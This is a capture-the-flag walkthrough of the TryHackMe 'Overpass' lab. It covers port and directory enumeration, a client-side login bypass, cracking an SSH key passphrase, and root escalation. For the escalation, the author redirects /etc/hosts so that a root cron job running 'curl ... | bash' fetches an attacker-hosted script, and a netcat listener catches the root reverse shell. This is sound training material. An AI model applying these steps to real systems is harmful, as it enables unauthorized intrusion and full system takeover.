Machine Enumeration

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ sudo nmap -sS 10.10.174.135 > open_ports.txt
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ cat open_ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 22:00 IST
Nmap scan report for 10.10.174.135
Host is up (0.46s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.90 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ cat ports_scan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 22:01 IST
Nmap scan report for 10.10.174.135
Host is up (0.45s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.56 seconds
```

SSH and HTTP ports opened.

<img src=https://github.com/user-attachments/assets/9668d3ba-ca87-447e-b13a-670866d51fb1>

A normal website that is functional. The Downloads page can be used to download the password manager.

Finding the subdirectories

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ ffuf -u http://10.10.174.135/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.174.135/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 581ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 452ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 453ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 460ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 472ms]
:: Progress: [20476/20476] :: Job [1/1] :: 89 req/sec :: Duration: [0:03:58] :: Errors: 0 ::
```

The admin page is the one to be exploited. I tried logging in with the common passwords and tried the common SQL injections, but it didn't work.

After trying things for minutes, I thought of intercepting the request using Burp Suite to check on the Headers and Responses.

Trying to log in with the intercept on, I made changes to the Response.

<img src=https://github.com/user-attachments/assets/4c75fd63-65dc-461a-8bac-fedbccc3aacd>

Changed the "200 OK" to "302 Found" and removed the "Incorrect Credentials". But nothing worked. I refreshed the page and got the SSH key on the web page.

<img src=https://github.com/user-attachments/assets/53abb602-c481-490e-a2b4-7e3d2b9cc760>

I didn't know how it worked. I tried to look in the source code of the login page, and there I saw the login.js file. I looked into that. Didn't understand the code properly. So, I looked at a write-up to know the reason.
The vulnerability in the code was that if "Incorrect Credentials" is returned, the login will not work. But if it is not returned, then a session token will be set and the access to the administrative panel will be given.

So will the SSH key; I tried to connect to the use 'James' with SSH.

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ ssh -i id_rsa james@10.10.174.135
The authenticity of host '10.10.174.135 (10.10.174.135)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.174.135' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

Using ssh2john and then cracking the passphrase.

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ ssh2john id_rsa > passphrase     
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ john passphrase --wordlist=/usr/share/wordlists/rockyou.txt                                                              
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2024-09-30 22:21) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/Desktop/THM/Overpass]
└─$ ssh -i id_rsa james@10.10.174.135                          
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 30 16:51:34 UTC 2024

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.174.135
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
```

There were 2 text files in the James directory: one was the flag file, user.txt, and the other was todo.txt

```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

The second point: James stored his password in the password manager. I retrieved the password from the password manager.

```
james@overpass-prod:~$ find / -name overpass 2>/dev/null
/usr/bin/overpass
james@overpass-prod:~$ /usr/bin/overpass
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
System   saydrawnlyingpictur
```

No sudoers permission for the user james, nothing from the SUID binaries. But the cronjobs file.

```
james@overpass-prod: cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

After seeing this, I knew that the content of the 'buildscript.sh' had to be changed to a reverse bash shell. It can be accessed from the web, to check the content. 

```
james@overpass-prod:/tmp$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

I was thinking and thinking about how to do that, but I couldn't get any idea. After thinking a lot, I looked at the write-up, and it turned out to be a simple way. The content of the '/etc/hosts' file can be changed as:

```
james@overpass-prod:/tmp$ echo "<my_IP>    overpass.thm" > /etc/hosts
james@overpass-prod:/tmp$ cat /etc/hosts
<my_IP>    overpass.thm
```

And I have to host a similar buildscript.sh file on my machine, the same format, with downloads and src directory as well.

After that, I hosted the server using Python and started a listener using NetCat.

```
┌──(kali㉿kali)-[~/Desktop/THM/Overpass/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.174.135 - - [30/Sep/2024 23:14:00] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -


┌──(kali㉿kali)-[~/…/Overpass/www/downloads/src]
└─$ nc -nlvp 9001 
listening on [any] 9001 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.174.135] 49844
bash: cannot set terminal process group (18233): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
whoami
root
root@overpass-prod:~# 
```
Gained the root shell.
